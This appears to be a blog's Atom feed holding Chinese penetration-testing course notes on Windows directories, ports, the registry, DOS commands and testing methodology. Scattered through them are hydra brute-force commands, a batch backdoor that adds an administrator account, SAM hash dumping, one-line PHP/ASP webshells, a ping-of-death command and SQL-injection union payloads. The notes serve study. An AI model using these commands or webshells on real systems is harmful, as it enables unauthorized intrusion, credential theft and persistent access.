+    <content type="html"><![CDATA[<pre><code>hydra:一般可以爆破ssh密码爆破https# hydra -m /index.php -l username -P pass.txt IP https爆破teamspeak爆破cisco破解smb# hydra -l administrator -P pass.txt IP smb</code></pre><a id="more"></a>    <pre><code>破解pop3破解rdp# hydra IP rdp -l administrator -P pass.txt -V-&gt;映射盘符-&gt;留后门.batcopy con c:\123.batnet user cracer 123 /addnet localgroup administrators cracer /addshutdown -s -t 1800 -c &quot;hacked by cracer&quot;ctrl+znetstat -an    --查看端口,及连接情况attrib 文件名(目录名) 查看某文件(目录)的属性attrib 文件名 -A -R -S -H 或 +A +R +S +H 去掉(添加)某文件的存档,只读,系统,隐藏属性;用+则是添加为某属性.</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      &lt;pre&gt;&lt;code&gt;hydra:
+一般可以爆破ssh密码
+爆破https
+# hydra -m /index.php -l username -P pass.txt IP https
+爆破teamspeak
+爆破cisco
+破解smb
+# hydra -l administrator -P pass.txt IP smb
+&lt;/code&gt;&lt;/pre&gt;
+    
+    </summary>
+    
+      <category term="技能" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/"/>
+    
+      <category term="编程" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/"/>
+    
+      <category term="后端" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/"/>
+    
+      <category term="渗透" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/"/>
+    
+      <category term="基础" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/%E5%9F%BA%E7%A1%80/"/>
+    
+      <category term="笔记" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/%E5%9F%BA%E7%A1%80/%E7%AC%94%E8%AE%B0/"/>
+    
+    
+      <category term="笔记" scheme="prayer007007.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
+    
+      <category term="编程" scheme="prayer007007.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
+    
+      <category term="渗透" scheme="prayer007007.github.io/tags/%E6%B8%97%E9%80%8F/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>渗透测试学习笔记03-06(2)-系统日志与端口与注册表</title>
+    <link href="prayer007007.github.io/2018/09/10/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B003-06-2-%E7%B3%BB%E7%BB%9F%E6%97%A5%E5%BF%97%E4%B8%8E%E7%AB%AF%E5%8F%A3%E4%B8%8E%E6%B3%A8%E5%86%8C%E8%A1%A8/"/>
+    <id>prayer007007.github.io/2018/09/10/渗透测试学习笔记03-06-2-系统日志与端口与注册表/</id>
+    <published>2018-09-09T19:52:43.000Z</published>
+    <updated>2018-09-09T11:53:34.321Z</updated>
+    
+    <content type="html"><![CDATA[<pre><code>系统日志信息:perflogs:管理-&gt;系统工具-&gt;事件查看器-&gt;windows日志-&gt;setup服务:services.msc是一种应用程序类型,在后台运行.服务应用程序通常可以在本地和通过网络为用户提供一些功能.作用:服务决定了计算机的一些功能是否被启用不同的 服务对应的功能不同通过计算机提供的服务可以有效实现资源共享</code></pre><a id="more"></a>    <pre><code>常见的服务:web,dns,dhcp,邮件,telnet,ssh,ftp,smb访问共享:(期间可以设置权限)cmd-&gt;\\192.168.80.137端口:(port)可以认为是计算机与外界通讯交流的出口.按端口号可分为3大类:公认端口(Well Known Ports);注册端口(Registered Ports);动态和/私有端口(Dynamic and/or Private Ports)一台拥有IP地址的主机可以提供许多服务,用&quot;IP地址+端口号&quot;来区分不同的服务的端口并不是一一对应的.知名端口():0-1023动态端口:1024-65535动态端口常被木马利用,如冰河默认连7626,WAY 连8011,Netspy 7306,YAI是1024端口按协议分为TCP,UDP和ICMP(Internet控制消息协议)TCP端口:传输控制协议端口,需要在客户端和服务端之间建立连接.reg:有21,23,25,80UDP端口:用户数据包协议段可可,无需在客户端和服务器之间建立连接.reg:有53,161,80000和40000常见的端口:HTTP协议代理服务器常用端口号:80/8080/3128/8081/9080FTP(文件传输)协议代理服务器常用端口号:21Telnet(远程登录)协议代理服务器常用端口:23TFTP,默认端口69/udp;SSH,SCP,端口重定向,默认为22/TCP;SMTP,25/TCP;POP3:110/TCP;TOMCAT:8080;WIN2003远程登录:3389;QQ:1080/UDP;&lt;-- 资料:win2003经典套装-戴有炜端口服务对照表黑客命令行攻防实战详解.至诚文化.扫...--&gt;黑客通过端口进行:信息搜集;目标探测;服务判断;系统判断;系统角色分析;注册表:(Registry)(windows称之为登录档)是windows中的一个重要的数据库,用于存储系统和应用程序的设置信息.存放各种参数,直接控制着windows的启动,硬件驱动程序的装载以及一些windows应用程序的运行.比如注册表中保存有应用程序和资源管理器外壳的初始条件,首选项和卸载数据等.联网计算机的整个系统的设置和各种许可,文件扩展名与应用程序的关联,硬件部件的描述,状态和属性.性能记录和其他底层的系统状态信息,以及其他数据等.cmd-&gt;regedit(安装后门-&gt;通过注册表)(可以改桌面,基本什么都可以)1.HKEY_CLASSES_ROOT管理文件系统.根据在Windows中按照的应用程序的扩展名,该根键指明其文件类型的名称,相应打开该文件所要调用的程序等等信息.2.HKEY_CURRENT_USER管理系统当前的用户信息.在这个根键中保存了本地计算机中存放的当前登录的用户信息,包括用户登录用户名和暂存的密码.在用户登录windwos98时,其信息从HKEY_USERS中相应拷贝到HKEY_CURRENT_USER中.3.HKEY_LOCAL_MACHINE(提权中经常用)管理当前系统硬件配置.在这个根键中保存了本地计算机硬件配置数据,此根键下的子关键字包括在SYSTEM.DAT中,用来提供HKEY_LOCAL_MACHINE所需的信息,或者在远程计算机中可访问的一组键中.这个根键里面的许多子键与System.ini文件中设置项类似.4.HKEY_USERS管理系统的用户信息.在这个根键中保存了存放在本地计算机口令列表中的用户标识和密码列表.同时每个用户的预配置信息都存储在HKEY_USERS根键中.HKEY_USERS是远程计算机中访问的根键之一.5.HKEY_CURRENT_CONFIG管理当前用户的系统配置.在这个根键中保存着定义当前用户桌面配置(如显示器等等)的数据,该用户使用过得文档列表(MRU),应用程序配置和其他有关当前用户的windwos98中文版的安装的信息.不少计算机系统感染了网络病毒后,可能会在这些注册表中做修改:HKEY_CURRENT_USER\Software\Microsoft\Windows\Current Version\RunOnceHKEY_CURRENT_USER\Software\Microsoft\Windows\Current Version\RunHKEY_CURRENT_USER\Software\Microsoft\Windows\Current Version\RunServices(1)IE起始页的修改HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main的右半部分窗口中的Start Page就是IE主页地址了.(2)Internet选项按钮灰化&amp;失效HKEY_CURRENT_USER\Software\Policies\Microsoft\Internet Explorer\Control Panel下的DWORD值&quot;Setting&quot;=dword:1 &quot;Links&quot;=dword:1 &quot;SecAddSites&quot; dword:1全部改为0之后再将HKEY_USERS\DEFAULT\Software\Policies\Microsoft\Internet Explorer\Control Panel下的DWORD值&quot;homepage&quot;键值改为0,则无法使用&quot;Internet选项&quot;修改IE设置(3)&quot;源文件&quot;项不可用HKEY_CURRENT_USER\Software\Policies\Microsoft\Internet Explorer\Restrictions的&quot;NoViewSource&quot;被设置为1了,改为0就可以恢复正常.(4)&quot;运行&quot;按钮被取消&amp;失效HKEY_CURRENT_USER\Software\Microsoft\Windows\Current Version\Policies\Explorer的&quot;NoRun&quot;键值被改为1了,改为0就可以恢复.(5)&quot;关机&quot;按钮被取消&amp;失效HKEY_CURRENT_USER\Software\Microsoft\Windows\Current Version\Policies\Explorer的&quot;NoClose&quot;键值被改为1了,改为0就可以恢复(6)&quot;注销&quot;按钮被取消&amp;失效HKEY_CURRENT_USER\Software\Microsoft\Windows\Current Version\Policies\Explorer的&quot;NoLogOff&quot;键值被改为1了,改为0就可恢复(7)磁盘驱动器被隐藏HKEY_CURRENT_USER\Software\Microsoft\Windows\Current Version\Policies\Explorer的&quot;NoDrives&quot;键值被改为1了,改为0就可恢复.入侵中常用的注册表:HKEY_LOCAL_MACHINE\software\hzhost\config\settings\mysqlpassHKEY_LOCAL_MACHINE\software\hzhost\config\settings\mssqlpssHKEY_LOCAL_MACHINE\software\hzhost\config\settings\mastersvrpassHKEY_LOCAL_MACHINE\SYSTEM\LIWEIWENSOFT\INSTALLFREEADMIN\11HKEY_LOCAL_MACHINE\SYSTEM\LIWEIWENSOFT\INSTALLFreeHost\11&lt;-- www.cracer.com/?post=374 --&gt;DOS:ping -t -l 65500 ip死亡之ping(发送大于64K的文件并一直ping就成了死亡之ping)TTL=53 低于68的是linux,win7,08,NT6.0的内核每经过一个路由器,就会-1TTL=128 XP,03systeminfo:复制补丁,和提权补丁对比.arp -a    查看所有局域网里的计算机xxx.xx.xx.网关ipren 原文件名 新文件名 重命名文件名net share ipc$ 开启ipc$共享net share ipc$ /del 删除ipc$共享net share c$ /del 删除C:共享内网渗透测试:Hydra破解密码</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      &lt;pre&gt;&lt;code&gt;系统日志信息:
+perflogs:
+管理-&amp;gt;系统工具-&amp;gt;事件查看器-&amp;gt;windows日志-&amp;gt;setup
+
+服务:services.msc
+是一种应用程序类型,在后台运行.服务应用程序通常可以在本地和通过网络为用户提供一些功能.
+
+作用:
+服务决定了计算机的一些功能是否被启用
+不同的 服务对应的功能不同
+通过计算机提供的服务可以有效实现资源共享
+&lt;/code&gt;&lt;/pre&gt;
+    
+    </summary>
+    
+      <category term="技能" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/"/>
+    
+      <category term="编程" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/"/>
+    
+      <category term="后端" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/"/>
+    
+      <category term="渗透" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/"/>
+    
+      <category term="基础" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/%E5%9F%BA%E7%A1%80/"/>
+    
+      <category term="笔记" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/%E5%9F%BA%E7%A1%80/%E7%AC%94%E8%AE%B0/"/>
+    
+    
+      <category term="笔记" scheme="prayer007007.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
+    
+      <category term="编程" scheme="prayer007007.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
+    
+      <category term="渗透" scheme="prayer007007.github.io/tags/%E6%B8%97%E9%80%8F/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>渗透测试学习笔记03-06(1)-网站搭建与http头</title>
+    <link href="prayer007007.github.io/2018/09/10/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B003-06-1-%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA%E4%B8%8Ehttp%E5%A4%B4/"/>
+    <id>prayer007007.github.io/2018/09/10/渗透测试学习笔记03-06-1-网站搭建与http头/</id>
+    <published>2018-09-09T19:51:15.000Z</published>
+    <updated>2018-09-09T11:52:03.654Z</updated>
+    
+    <content type="html"><![CDATA[<pre><code>网站篇http头讲解:HTTP/1.1 HTTP版本号200 响应码</code></pre><a id="more"></a>    <pre><code>动态网站:指网站内容可根据不同情况动态变更的网站,一般情况下动态往后在哪通过数据库进行架构.百度-&gt;inur:asp?id=网址/robots.txt是否是伪静态,自己改网址.    .html-&gt;    .php?id=xxx测试是否有注入 and 1=1    --%20 ,即查到黑客入侵网站搭建:1.windows+iis+asp+access2.windows+iis+asp+mssql3.windows+asp小旋风+asp+access1.windows+apmserv+php+mysql2.windows+tomcat+jsp+mysql3.linux+apche+php+mysql</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      &lt;pre&gt;&lt;code&gt;网站篇
+
+http头讲解:
+
+HTTP/1.1 HTTP版本号
+200 响应码
+&lt;/code&gt;&lt;/pre&gt;
+    
+    </summary>
+    
+      <category term="技能" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/"/>
+    
+      <category term="编程" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/"/>
+    
+      <category term="后端" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/"/>
+    
+      <category term="渗透" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/"/>
+    
+      <category term="基础" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/%E5%9F%BA%E7%A1%80/"/>
+    
+      <category term="笔记" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/%E5%9F%BA%E7%A1%80/%E7%AC%94%E8%AE%B0/"/>
+    
+    
+      <category term="笔记" scheme="prayer007007.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
+    
+      <category term="编程" scheme="prayer007007.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
+    
+      <category term="渗透" scheme="prayer007007.github.io/tags/%E6%B8%97%E9%80%8F/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>渗透测试学习笔记02-windows讲解</title>
+    <link href="prayer007007.github.io/2018/09/10/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002-windows%E8%AE%B2%E8%A7%A3/"/>
+    <id>prayer007007.github.io/2018/09/10/渗透测试学习笔记02-windows讲解/</id>
+    <published>2018-09-09T19:44:44.000Z</published>
+    <updated>2018-09-09T11:45:41.317Z</updated>
+    
+    <content type="html"><![CDATA[<pre><code>`系统目录,服务,端口,注册表系统目录:    windows    program files    用户    perflogs    -&gt;    perfLogs是windows7的日志信息    ProgramData-&gt;(一般木马喜欢感染这些)(存放应用程序的临时配置文件,会随着应用启动生成一些配置文件)    杀软一般不杀ProgramData这个目录.    64位指cpu    (x86)指如果默认是32位就默认安装在x86下面</code></pre><a id="more"></a>        <pre><code>    Temp:临时文件    Windows-&gt;System32-&gt;config-&gt;SAM    用PE不进系统,去开SAM-&gt;lc5破解/彩虹表    有权限的话对SAM进行读取哈希值,然后就可以破解    pe可以改SAM明文,但是不能读    (权限提升-&gt;getpass)(可以读明文,可以读哈希)    cmd-&gt;net user administrator 123.com    抓哈希:    cmd-&gt;PwDump7.exe(pw7)-&gt;密文:500是UID号,windows是500,linux是0第一行第二段是密文    明文:(能读出来就是要管理权限)    Windows-&gt;System32-&gt;drivers-&gt;etc-&gt;hosts    DNS服务器:    数据包-&gt;指定DNS服务器-&gt;DNS服务器查询域名对应的IP-&gt;百度    (hosts优先级要高于DNS服务器)(reg:ping www.baidu.com)    (hosts-&gt;最后写上1.1.1.1 www.baidu.com 进行测试)    -&gt;附:DNS:    DNS(Domain Name Server,域名服务器)是进行域名(domain name)和与之相对应的IP地址(IP address)转换的服务器.    DNS是计算机域名系统 (Domain Name System 或Domain Name Service)     的缩写，它是由域名解析器和域名服务器组成的。域名服务器是指保存有    该网络中所有主机的域名和对应IP地址，并具有将域名转换为IP地址功能的服务器。    DNS服务器在域名解析过程中的查询顺序为：本地缓存记录、区域记录、转发域名服务器、根域名服务器。    用户-&gt;用户名-&gt;    (对内网进行渗透的话要用这个)(不用登陆该电脑账号来通过权限查询桌面信息)    服务:    定义计算机开了哪些功能,    services.msc    metasploit,msf-&gt;kali安装后门    pentestbox-&gt;将kali工具封装打包放在win下    常见的服务:    web服务,dns服务,dhcp服务,邮件服务,telent服务,ssh服务,ftp服务,smb服务    web服务:搭建网站的    dhcp服务:给客户机分发可用ip    telnet服务:远程连接.    cmd-&gt;netstat -an 端口是23. (远程端口)    win7打开windos功能安装telnet客户端.    远程登录过去之后,ipconfig就显示的是远程端的IP    爆破密码:(网速,性能,成功率很少)(一般对该人进行信息搜集来增加几率)        CPU集成电路板,集成很多CPU,来进行爆破        GPU显卡爆破        密码攻击-&gt;hydra-8.1-win        字典文件-&gt;pass.txt(演示用自己生成)        太长的话就改文件夹名-&gt;hy        cmd-&gt;hydra.exe -l administrator -P pass.txt 192.168.3.100 telnet    服务端口:(1-65535)        1-1024:预保留端口,已经占用了,一般设置8000之后的        80:www(web)        21:ftp        25:smtp        20:也算ftp        53:dns        67,68:dhcp        69:tftp        43:https        45:smb(共享服务)        3306:mysql        1433:sqlserver        1521:oracle        23:telnet        22:ssh        25:smtp        110:pop3        --------------        :vnc        8021:filze        43958:serveru        3389:rdp(远程桌面)    黑客通过端口可以:    信息搜集,目标探测,服务判断,系统判断,系统角色分析    系统判断-&gt;linux 22. telnet被窃取的话会被发现,ssh是有加密的    nmap-O 192.168.3.100(端口扫描之王)-&gt;探测版本    系统角色分析:80,21-&gt;做网站的虚拟子机(阿里云就是这么干的,比较安全)    ping www.cracer.com    (阿里云,创宇安全性好一点)    注册表:    5个跟键-&gt;子键    是windows操作系统的核心数据库.    默认浏览器有时候也要修改注册表    木马3个部分看:    1.regedit    2.msconfig-&gt;启动 C:-&gt;programData-&gt;Microsoft-&gt;Windows-&gt;开始菜单-&gt;程序-&gt;启动  删除/记事本清空它    3.通过网络来查    cmd netstat -n     (检测到的,一般是动态域名,或者用的其他的电脑ip)`DOS命令    一般在提权的时候用    color /?        ping -t -|    ipconfig /release释放IP /renew重新获取IP /all    systeminfo    --获取系统详细信息(最主要是判断有没有安装补丁)(漏洞没有打补丁的话就可以直接提权)    arp -a        --获取当前局域网中有哪些主机的ip的            只能判断最近一次缓存表里存在的主机,每5分钟返回一次    net view    --获取局域网有哪些主机名    shutdown -s -t 180 -c &quot;hello&quot;    shutdown -a    msg        --系统命令弹框        mas hackerhost &quot;hello hackerxxx&quot;    dir        --dir c:    cd    start        --start www.baidu.com            --路径&gt;start pass.txt            --路径&gt;notepad pass.txt    copy        --copy pass.txt C:\    del        --del c:\pass.txt    md        --创建目录            md xiaomulu    rd        --删除目录            rd xiaomulu    /*    创建    copy con 123.txt    创建123.txt    hello cracer    xxxx    xxxxx    最后按 ctrl+z回车 保存.    */    type 123.txt    --在命令行中打开    cat 123.txt    --linux里面的命令    move 123.txt hy    --移动    后面跟的移到哪        tree        --查看文件    net use K: \\192.168.3.100\c$     回车    --盘符映射    administrator 123456    就会在本地创建一个K盘    (开防火墙,就会拦截)    ncpa.cpl        --本地连接    net use K: /del    --删除映射    net start telnet --开启telnet服务(必须不是禁用的)    net stop telnet  --关闭    net user    --查看user    net user xiao 123 /add    --添加xiao用户    net localgroup administrators xiao /add --提升权限    net localgroups    --查看本地有哪些组        Remote Desktop Users    --远程桌面用户组    如果有安装了安全狗,能创建用户但是不能加到管理员组,但是可以加入到远程桌面组,这里还是普通用户    然后,将文件都降权处理.(有杀狗神器)    net localgroup &quot;remote desktop users&quot; xiao /add    net user    Guest    net user guest /active:yes    --启用    net user guest 123456    net localgroup administrators guest /add    net user xiao 123 /ad    --也可以创建用户,现在也绕不过360了    netstat        --查看端口    tasklist    --查看进程    taskkill /im cmd.exe    --结束进程    netsh        --网络管理的接口    netsh wlan set hostednetwork mode=allow ssid=cc key=123456    netsh wlan start hosted    --加载wlan    at        --设置计划任务/查看计划        at 22:51 shutdown -s -t 1800    attrib    批处理:bat(很多dos命令放在一个里面)    copy con x.bat    net user cr 123.com /add    net localgroup administrators cr /add    shutdown -s -t -c &quot;hello hacked by cr .you are hacking...&quot;    ctrl+z 回车    任务:    1.熟记服务对应端口    2.常用dos命令</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      &lt;pre&gt;&lt;code&gt;`系统目录,服务,端口,注册表
+系统目录:
+    windows
+    program files
+    用户
+    perflogs
+    -&amp;gt;
+    perfLogs是windows7的日志信息
+    ProgramData-&amp;gt;(一般木马喜欢感染这些)(存放应用程序的临时配置文件,会随着应用启动生成一些配置文件)
+    杀软一般不杀ProgramData这个目录.
+    64位指cpu
+    (x86)指如果默认是32位就默认安装在x86下面
+&lt;/code&gt;&lt;/pre&gt;
+    
+    </summary>
+    
+      <category term="技能" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/"/>
+    
+      <category term="编程" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/"/>
+    
+      <category term="后端" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/"/>
+    
+      <category term="渗透" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/"/>
+    
+      <category term="基础" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/%E5%9F%BA%E7%A1%80/"/>
+    
+      <category term="笔记" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/%E5%9F%BA%E7%A1%80/%E7%AC%94%E8%AE%B0/"/>
+    
+    
+      <category term="笔记" scheme="prayer007007.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
+    
+      <category term="编程" scheme="prayer007007.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
+    
+      <category term="渗透" scheme="prayer007007.github.io/tags/%E6%B8%97%E9%80%8F/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>渗透测试学习笔记01-基础讲解</title>
+    <link href="prayer007007.github.io/2018/09/10/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B001-%E5%9F%BA%E7%A1%80%E8%AE%B2%E8%A7%A3/"/>
+    <id>prayer007007.github.io/2018/09/10/渗透测试学习笔记01-基础讲解/</id>
+    <published>2018-09-09T19:42:23.000Z</published>
+    <updated>2018-09-09T11:43:27.383Z</updated>
+    
+    <content type="html"><![CDATA[<pre><code>`测试会用到虚拟机,一般加个内存条就行`会考试,笔试+机试被抓的话挂VPN也没用常用的术语:1.脚本(asp,php,jsp)    --右击看不到源代码2.html(css,js,html)3.HTTP协议    --https(加密)    --http抓包能抓到账号密码4.CMS(B/S)(sei mou si)   DZ,南方,帝国,思途,dedecms        --企业网站用(),医院(织梦:做SU好优化,好推广),学校(织梦),博客(wordpress)    --论坛(DZ(discuz))</code></pre><a id="more"></a>        <pre><code>5.MD5    --加密算法(不可逆)(哈希值16,32位...)(注入)    --20位(去掉前3位,后去1位)(织梦)6.肉鸡,抓鸡,跳板    --肉鸡:被控的电脑,被黑客入侵并被长期驻扎的计算机或服务器    --抓鸡:控制别人电脑的过程,利用使用量大的程序的漏洞,使用自动化方式获取肉鸡的行为    --跳板:在入侵的时候找一台肉鸡来当跳板,通过肉鸡来入侵    (挂VPN的话,人家就会记录你VPN的IP)    (直接入侵,记录的是IP,通过挂个VPN来连接另外一台电脑,通过另外一台电脑来入侵,该电脑就是跳板,记录的是中间的这台电脑IP)7.一句话,小马,大马webshell,提权,后门,跳板    Webshell:通过web入侵的一种脚本工具,可以据此对网站服务进行一定程度的控制    --一句话:一句话(木马,比如:asp写&lt;% eval()%&gt;||&lt;?php @eval($_POST[&apos;XXX&apos;]);?&gt;)    (预处理前期变量来接收信息.)(参数:也就是密码,菜刀手连接的密码)    --小马:之前是用海洋顶端,小马的功能:用来上传大马.两个框,一个保存文件的地址,一个是保存文件的内容.(小马拉大马)    &lt;form method=post action=&quot;&quot;//木马地址&gt;        &lt;textarea name=cracer&gt;            //这里写php代码            phpinfo();        &lt;/textarea&gt;        &lt;input type=submit /&gt;    &lt;/form&gt;    --大马:控制网站不满足,就需要webshell提权到管理员对整个服务器控制.就需要上传大马.    --webshell:网站后门,一句话,小马,大马都称webshell.    --提权:提升服务器权限.操作系统低权限的账户将自己提升为管理员权限使用的方法    --后门:留后门方便下次进入.有很多种后门.黑客为了对主机进行长期的控制,在机器上种植的一段        程序或留下的一个&quot;入口&quot;    --旁站入侵:        即同服务器下的网站入侵,入侵之后可以通过提权跨目录等手段拿到目标        网站的权限.常见的旁站查询工具有:webRobot,御剑,明小子和web在线查询等.    --C段入侵:        即同C段下服务器入侵.如目标ip为192.168.1.253入侵192.168.1.*的任意一台机器,        然后利用这些黑客工具嗅探获取在网络上传输的各种信息,常用的工具有:在windows        下有cain,在unix下有snifft,snoop,tcpdump,dsniff等.8.源码打包,脱裤    --源码打包:下载源码    --脱裤:拖数据库信息(主要拖用户数据)9.嗅探,rookit    --抓包嗅探,网络数据包.    --rookit:系统机隐藏后门(抓3个鸡就要判3-5年)(鸡可以买,看服务器网络接口定位价钱)    (海洋cms6.28 做视频的)-&gt;任务:1.下载各种CMS(php,asp)10-15个,搭建起来渗透测试流程:(特点:思路+经验)    黑盒测试:    在未授权的情况下,模拟黑客的攻击方法和思维方式,来评估计算机网络系统可能存在的安全风险.    黑盒测试不同于黑客入侵,并不等于黑站.黑盒测试考验的是综合的能力(OS,Datebase,Script,code,思路,社工)    -&gt;(给公司写一份报告写出来就ok了)    白盒测试:相对黑盒测试,白盒测试基本是从内部发起.    另一种说法:知道源代码和不知道源代码的渗透测试.白盒偏代码审计.    APT攻击:    Advanced Persistent Threat,高级可持续性攻击,是指组织或者小团体利用先进的攻击手段对特定目标进行    长期持续性网络攻击的攻击形式.    (1).极强的隐蔽性.    (2).潜伏期长,持续性强    (3).目标性强    1.明确目标:        确定范围        确定规则        确定需求    2.信息收集:        基础信息        系统信息        应用信息        版本信息        服务信息        人员信息        防护信息    3.漏洞探测        系统漏洞        webServer漏洞        web应用漏洞        其他端口服务漏洞        通信安全    4.漏洞验证        自动化验证        手工验证        试验验证        登陆猜解        业务漏洞验证        公开资源的利用    5.信息分析        精准打击        绕过防御机制        定制攻击路径        绕过检测机制        攻击代码    6.获取所需        实施攻击        获取内部信息        进一步渗透        持续性存在*        清理痕迹    7.信息整理        整理渗透工具        整理收集信息        整理漏洞信息    8.形成报告        按需整理        补充介绍        修补建议    经验分享:        信息搜集        注意搜集0day流程:委托受理极端:    受理客户申请-&gt;签署保密协议-&gt;签订合同评测准备阶段:    编制测评方案-&gt;方案沟通确认评测实施阶段:    工具扫描-&gt;人工审计综合评估阶段:    编制测评报告-&gt;报告审批-&gt;报告发送结题阶段:    报告归档-&gt;报告总结-&gt;客户满意度调查(VM一般用国外的)    (公司教的是业务流程,不是技术流程)    (两个标准)(OWASP top 10)    信息收集(占60%-80%)    (所有人,cms,后台url,dns,whois查询,端口,,邮箱旁站,C段)    (whios-&gt;可以查到注册邮箱,姓名,地址,电话...)    (WAF,,工具网站,整站,子域,C段,目录扫描)    漏洞探测    (sql注入,xss,文件上传,下载漏洞,文件包含,变量覆盖,代码执行)    漏洞验证    (poc,尽量不要写exp)(poc漏洞验证,exp漏洞利用)    (reg:id=27 and select version(),证明这个漏洞存在)    (exp:reg:id=27 union select 1,2,admin,pass from admin)(直接暴露用户名和密码)学习环境配置:    百度:vmware(官网)    -&gt;下载-&gt;点右边第二个-&gt;Desktop-&gt;VMware W P 下载产品    百度:vmware 注册码    1F04Z-6D111-7Z029-AV0Q4-3AEH8    (如果有中断报错,去博客http://www.cracer.com/?post=328)(一个批处理,先运行批处理就能解决了)    (要求安装个人系统,win xp,win 7服务器系统,win 03,linux)    (linux-&gt;版本:Debian 6)    虚拟机应用配置:        (VMware WORKSTATION 12 PRO)        (网络,扩容,IIS,系统映射文件)        (XP,win7,2003,2008,2012,linux)    网络连通:        (网络适配器NAT),虚拟机虚拟出来的网卡        (自定义,桥接,NAT模式)        (上网用NAT模式)(cmd-&gt;ncpa.cpl)        (属性-&gt;自动获取IP)(指派-&gt;在VM的编辑-&gt;虚拟网络里面查找)        (子网IP)(DHCP)        (service-&gt;VM-DHCP/NAT-&gt;都要启动)(services.msc)        (cmd-&gt;ping-&gt;TTL=128,xp,08一般返回128)(中间经过几个路由器TTL就减多少)        (自定义-&gt;VMnet)(编辑-&gt;虚拟网络)(不能上网,仅本机测试)        (桥接,发布虚拟机的网站)(虚拟机和物理机在同一个网络.)        (物理机物理网络-&gt;ping-&gt;IPv4)        (路由器-&gt;端口映射-&gt;搭站)(找了一个access源码-&gt;复制到VM-&gt;192.168.0.104:99)        (192.168.0.1-&gt;高级用户-&gt;虚拟服务器-&gt;填一个)        (当别人看我IP时,我要映射到VM的IP)        (本机IP:99-&gt;可以访问VM的网址)        (一定要在路由器上进行,没有路由器就直接访问,二级路由器可以试试ping,能ping通就能找到)        (配置虚拟机之后,要点一个快照.之后玩坏就点快照一键恢复)    测试系统的安装:    HTTP协议讲解:        403:(页面存在,但是不能访问目录下的内容)        http:url(http://host[&quot;:&quot;port][abs_path])        